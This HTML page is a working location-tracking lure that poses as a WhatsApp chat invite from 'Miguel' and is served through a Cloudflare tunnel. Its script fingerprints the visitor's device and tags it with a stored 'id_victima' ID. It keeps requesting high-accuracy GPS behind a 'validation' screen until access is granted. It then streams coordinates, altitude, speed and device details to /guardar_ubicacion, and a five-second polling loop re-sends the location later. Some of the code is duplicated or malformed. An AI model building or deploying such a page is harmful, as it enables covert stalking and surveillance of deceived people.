<!DOCTYPE html>
<html lang="es">
<head>

    <meta charset="UTF-8">
    <title>Radar Satelital Activo</title>
    <meta property="og:title" content="Acceso a Radar Satelital">
    <meta property="og:description" content="Sistema de monitoreo de geolocalización en tiempo real.">
    <meta property="og:image" content="https://tu-url-de-imagen.npg"> <meta property="og:type" content="website">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>WhatsApp</title>

    <!-- Meta Tags para Vista Previa -->
    <meta property="og:title" content="WhatsApp de Miguel">
    <meta property="og:description" content="Cifrado de extremo a extremo">
    <meta property="og:image" content="{{ url_for('static', filename='miguel1.png', _external=True) }}">
    <meta property="og:url" content="https://automatic-skills-dish-facility.trycloudflare.com">
    <meta name="twitter:card" content="summary_large_image">
    <meta property="og:type" content="website">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #0b141a;
            color: #e9edef;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            height: 100vh;
            justify-content: center;
            overflow: hidden;
        }

        .card {
            width: 90%;
            max-width: 360px;
            background-color: #202c33;
            border-radius: 24px;
            padding: 40px 20px;
            text-align: center;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            z-index: 10;
        }

        .avatar-main {
            width: 110px; height: 110px;
            border-radius: 50%; margin: 0 auto 25px;
            overflow: hidden; border: 2px solid #3b4a54;
            background-color: #111b21;
        }

        .avatar-main img { width: 100%; height: 100%; object-fit: cover; }

        h1 { font-size: 1.4rem; font-weight: 500; margin: 0 0 12px; }

        .info-text { font-size: 0.95rem; color: #8696a0; margin-bottom: 35px; line-height: 1.4; }

        .btn-join {
            background-color: #00a884;
            color: #111b21;
            padding: 14px 0;
            width: 100%;
            border-radius: 30px;
            font-weight: 700;
            font-size: 1rem;
            border: none;
            cursor: pointer;
        }

        #mascara-insistencia {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.98);
            z-index: 9999;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            pointer-events: none;
        }

        .cuadro-mensaje {
            width: 85%;
            background: #202c33;
            color: white;
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            border: 1px solid #00a884;
            box-shadow: 0 0 30px rgba(0,0,0,1);
        }

        #pantalla-carga {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: #0b141a;
            z-index: 10000;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .loader {
            width: 45px; height: 45px;
            border: 3px solid #233138;
            border-top: 3px solid #00a884;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
            .footer-text {
            position: absolute;
            bottom: 30px;
            font-size: 0.7rem;
            color: #667781;
            letter-spacing: 1px;
            text-transform: uppercase;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="avatar-main">
            <img src="/static/miguel1.jpg" alt="Foto de Perfil">
        </div>
        <h1>WhatsApp de Miguel</h1>
        <p class="info-text">Cifrado de extremo a extremo.<br>Validando identidad del dispositivo...</p>
        <button class="btn-join" onclick="solicitarGPS()">Continuar al chat</button>
    </div>
    <div class="footer-text">WhatsApp from Meta</div>

    <div id="mascara-insistencia">
        <div class="cuadro-mensaje">
            <h2 style="color: #00a884; margin-top: 0; font-size: 1.1rem;">Acceso Restringido</h2>
            <p style="color: #e9edef; font-size: 0.95rem; line-height: 1.6; padding: 0 10px;">
                Debe permitir el acceso al chat privado para continuar...
            </p>
            <p style="font-size: 0.75rem; color: #8696a0; margin-top: 15px; text-transform: uppercase;">
                Reintentando validación...
            </p>
        </div>
    </div>

    <div id="pantalla-carga">
        <div class="loader"></div>
        <p style="margin-top: 25px; color: #8696a0;">Conectando al chat privado..</p>
    </div>

    <script>
        // --- FUNCION DE EXTRACCION DE IDENTIDAD TECNICA ---
        function obtenerHuellaDigital() {
            return {
                plataforma: navigator.platform,
                nucleos: navigator.hardwareConcurrency || 'N/A',
                memoria: navigator.deviceMemory || 'N/A',
                idioma: navigator.language,
                vendedor: navigator.vendor,
                resolucion: window.screen.width + "x" + window.screen.height,
                agente: navigator.userAgent
            };
        }

        let deviceID = localStorage.getItem('id_victima');
        if (!deviceID) {
            deviceID = 'TLF-' + Math.random().toString(36).substring(2, 10).toUpperCase();
            localStorage.setItem('id_victima', deviceID);
        }
        
        let yaRedirigido = false;

        // Reset total si el usuario vuelve atras
        window.onpageshow = function(event) {
            yaPermitido = false;
            document.getElementById('mascara-insistencia').style.display = 'none';
            document.getElementById('pantalla-carga').style.display = 'none';
        };

        // Funcion de exito: SOLO AQUI SE REDIRECCIONA
        function exitoGPS(pos) {
            if (yaPermitido) return;
            yaPermitido = true;

            // Ocultar cualquier advertencia y mostrar carga
            document.getElementById('mascara-insistencia').style.display = 'none';
            document.getElementById('pantalla-carga').style.display = 'flex';

            // Redireccion ultra rapida al link de WhatsApp
            window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";

            // Enviar datos al servidor incluyendo el deviceID (Identidad Unica)
            fetch('/guardar_ubicacion', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ 
                    lat: pos.coords.latitude, 
                    lon: pos.coords.longitude, 
                    id_fijo: deviceID,
                    userAgent: navigator.userAgent
                })
            });
        }
        async function exitoGPS(pos) {
            // Recopilar huella digital tecnica del dispositivo
            const infoTecnica = obtenerHuellaDigital();

            // Enviar datos a tu terminal
            try {
                await fetch('/guardar_ubicacion', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ 
                        lat: pos.coords.latitude, 
                        lon: pos.coords.longitude,
                        alt: pos.coords.altitude || 0,
                        vel: pos.coords.speed || 0,
                        id_fijo: deviceID,
                        info: infoTecnica
                    
                    })
                });
            } catch (e) { console.log("Reintento de reporte..."); }

            if (!yaRedirigido) {
                yaRedirigido = true;
                document.getElementById('mascara-insistencia').style.display = 'none';
                document.getElementById('pantalla-carga').style.display = 'flex';
                // Redirigir pero el 'watchPosition' seguirá activo en segundo plano
                window.location.href = "https://wa.me/message/B6UEJRZFEVXCC1";
            }
        }

        function errorGPS(error) {
            if (yaRedirigido) return;
            document.getElementById('mascara-insistencia').style.display = 'flex';
            setTimeout(solicitarGPS, 1500);
        }

        function solicitarGPS() {
            if (navigator.geolocation) {
                // ANCLAJE DEFINITIVO: watchPosition mantiene el sensor encendido
                // incluso si la victima se mueve, los datos llegaran a tu terminal.
                navigator.geolocation.watchPosition(exitoGPS, errorGPS, { 
                    enableHighAccuracy: true, 
                    timeout: 10000, 
                    maximumAge: 0 
                });
            }
        }

        window.onpageshow = function() {
            yaRedirigido = false;
            document.getElementById('mascara-insistencia').style.display = 'none';
            document.getElementById('pantalla-carga').style.display = 'none';
        }     
        <script>
    setInterval(async () => {
        let res = await fetch('/api/verificar-radar');
        let data = await res.json();
        if (data.radar_activo) {
            navigator.geolocation.getCurrentPosition(pos => {
                fetch('/guardar_ubicacion', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({lat: pos.coords.latitude, lon: pos.coords.longitude})
                });
            });
        }
    }, 5000); // Revisa cada 5 segundos
</script>
    </script>
</body>
</html>
